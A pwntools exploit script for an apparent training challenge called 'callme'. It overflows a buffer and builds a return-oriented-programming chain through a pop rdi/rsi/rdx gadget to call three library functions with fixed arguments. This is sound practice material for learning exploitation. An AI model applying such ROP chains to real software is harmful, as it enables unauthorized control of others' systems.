from pwn import * 
import os


# setting up my enviroments and context
os.environ["SHELL"] = "/bin/sh"

context.binary = elf = ELF("./callme")
context.arch = "amd64"
context.os = "linux"
context.terminal = ['st', '--', '/bin/sh', '-c']


offset = cyclic_find(0x6161616c6161616b)

find_offset = cyclic(200)

# gadget that will be used in the exploit

r_return = 0x6a6

pop_rdi_rsi_rdx = 0x40093c
pop_rsi_rdx = 0x40093d
pop_rdx = 0x40093f

# arguments for the call functions
arg_1 = 0xdeadbeefdeadbeef
arg_2 = 0xcafebabecafebabe
arg_3 = 0xd00df00dd00df00d


# how to load the arguments: edx -> arg_3, esi -> arg_2 , edi -> arg_1
# because pop_rdi_rsi_rdx is constructed that way, we will load pop_rdi_rsi_rdc -> arg_3, arg_2, arg_1
# rdi -> arg_1, rsi -> arg_2, rdx -> arg_3

payload = flat(
        b'a' * offset,
        pop_rdi_rsi_rdx,
        arg_1,
        arg_2,
        arg_3,
        elf.plt['callme_one'],
        pop_rdi_rsi_rdx,
        arg_1,
        arg_2,
        arg_3,
        elf.plt['callme_two'],
        pop_rdi_rsi_rdx,
        arg_1,
        arg_2,
        arg_3,
        elf.plt['callme_three'],
        )

gdb_script = '''
            break * 0x4008e5
            continue
        '''

#io = gdb.debug(elf.path, gdbscript=gdb_script)

io = elf.process()

print(io.recv().decode())

pause()

# find the offset through cyclic
#io.sendline(find_offset)

io.sendline(payload)


print(io.recv().decode())
